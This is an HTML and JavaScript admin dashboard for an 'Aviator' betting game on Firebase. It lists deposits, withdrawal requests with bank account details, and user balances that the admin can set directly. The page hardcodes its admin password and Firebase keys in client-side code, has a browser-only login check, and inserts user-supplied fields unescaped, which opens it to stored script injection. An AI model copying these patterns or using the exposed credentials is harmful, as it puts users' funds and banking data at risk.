<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aviator Admin - Control Center</title>
    
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, collection, doc, updateDoc, deleteDoc, onSnapshot, getDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCrk8ksYM1Kt6ehT0TkDr3vjybjHDCyDgc",
            authDomain: "myaviatoregame.firebaseapp.com",
            projectId: "myaviatoregame",
            storageBucket: "myaviatoregame.firebasestorage.app",
            messagingSenderId: "286687400349",
            appId: "1:286687400349:web:e01e2cff439a3267de1f74"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore();

        window.accessAdmin = () => {
            const pass = document.getElementById('admin-pass').value;
            if(pass === "7648954487Dkd@#") {
                document.getElementById('login-box').style.display = 'none';
                document.getElementById('admin-content').style.display = 'block';
                startRealtimeUpdates();
            } else { alert("Wrong Password!"); }
        };

        function startRealtimeUpdates() {
            onSnapshot(collection(db, "deposits"), (snapshot) => {
                let html = "";
                snapshot.forEach((dDoc) => {
                    const data = dDoc.data();
                    html += `<div class="card item-row" style="border-left: 4px solid #00d4ff">
                        <div><b>Deposit: ‚Çπ${data.amt}</b><br><small>UTR: ${data.utr}</small><br><small>User: ${data.email}</small></div>
                        <div>
                            <button class="btn btn-save" onclick="approveDeposit('${dDoc.id}', '${data.uid}', ${data.amt})">Approve</button>
                            <button class="btn btn-reject" onclick="deleteReq('deposits', '${dDoc.id}')">Reject</button>
                        </div>
                    </div>`;
                });
                document.getElementById('deposit-list').innerHTML = html || "No pending deposits.";
            });

            onSnapshot(collection(db, "withdrawals"), (snapshot) => {
                let html = "";
                snapshot.forEach((wDoc) => {
                    const data = wDoc.data();
                    html += `<div class="card item-row" style="border-left: 4px solid #d97706">
                        <div><b>Withdraw: ‚Çπ${data.amt}</b><br><small>A/C: ${data.acc} | IFSC: ${data.ifsc}</small><br><small>Name: ${data.name} (${data.email})</small></div>
                        <div>
                            <button class="btn btn-save" style="background:#d97706" onclick="deleteReq('withdrawals', '${wDoc.id}', 'Paid Successfully')">Mark Paid</button>
                            <button class="btn btn-reject" onclick="deleteReq('withdrawals', '${wDoc.id}', 'Rejected')">Reject</button>
                        </div>
                    </div>`;
                });
                document.getElementById('withdraw-list').innerHTML = html || "No pending withdrawals.";
            });

            onSnapshot(collection(db, "users"), (snapshot) => {
                let html = "";
                snapshot.forEach((userDoc) => {
                    const data = userDoc.data();
                    html += `<div class="card item-row">
                        <div><b>${data.email}</b><br><span style="color:#28a745">Bal: ‚Çπ${(data.balance || 0).toFixed(2)}</span></div>
                        <div>
                            <input type="number" id="amt-${userDoc.id}" placeholder="Set Bal" style="width:70px">
                            <button class="btn btn-save" onclick="updateBalance('${userDoc.id}')">Set</button>
                        </div>
                    </div>`;
                });
                document.getElementById('user-list').innerHTML = html || "No users.";
            });
        }

        window.approveDeposit = async (docId, uid, amount) => {
            try {
                const userRef = doc(db, "users", uid);
                const userSnap = await getDoc(userRef);
                if (userSnap.exists()) {
                    const newBal = (userSnap.data().balance || 0) + parseFloat(amount);
                    await updateDoc(userRef, { balance: newBal });
                    await deleteDoc(doc(db, "deposits", docId));
                    alert("Deposit Approved!");
                }
            } catch (e) { alert(e.message); }
        };

        window.updateBalance = async (uid) => {
            const val = parseFloat(document.getElementById('amt-'+uid).value);
            if(isNaN(val)) return alert("Enter amount");
            await updateDoc(doc(db, "users", uid), { balance: val });
            alert("User balance updated!");
        };

        window.deleteReq = async (col, id, msg = "Action Done") => {
            if(confirm("Confirm this action?")) {
                await deleteDoc(doc(db, col, id));
                alert(msg);
            }
        };
    </script>
    <style>
        :root { --bg: #0a0e17; --card-bg: #161d2b; --primary: #ff0055; --green: #28a745; --blue: #00d4ff; }
        body { background: var(--bg); color: white; font-family: sans-serif; padding: 20px; margin: 0; }
        .container { max-width: 900px; margin: auto; }
        .card { background: var(--card-bg); padding: 15px; border-radius: 10px; border: 1px solid #252f44; margin-bottom: 10px; }
        .item-row { display: flex; justify-content: space-between; align-items: center; gap: 10px; }
        h2 { border-bottom: 2px solid #252f44; padding-bottom: 10px; font-size: 18px; margin-top: 30px; color: var(--blue); }
        input { background: #000; border: 1px solid #333; color: white; padding: 8px; border-radius: 5px; outline: none; }
        .btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        .btn-save { background: var(--green); color: white; }
        .btn-reject { background: #dc3545; color: white; }
        #login-box { text-align: center; margin-top: 100px; max-width: 400px; margin-inline: auto; }
        h1 { color: var(--primary); text-align: center; }
    </style>
</head>
<body>
<div class="container">
    <div id="login-box" class="card">
        <h1>ADMIN ACCESS</h1>
        <input type="password" id="admin-pass" placeholder="Enter Password" style="width:80%"><br><br>
        <button class="btn btn-save" style="width:85%" onclick="accessAdmin()">LOGIN</button>
    </div>
    <div id="admin-content" style="display:none;">
        <h1>ADMIN DASHBOARD</h1>
        <h2>üí∞ PENDING DEPOSITS</h2>
        <div id="deposit-list">Loading...</div>
        <h2>üè¶ WITHDRAWAL REQUESTS</h2>
        <div id="withdraw-list">Loading...</div>
        <h2>üë• REGISTERED USERS</h2>
        <div id="user-list">Loading...</div>
    </div>
</div>
</body>
</html>
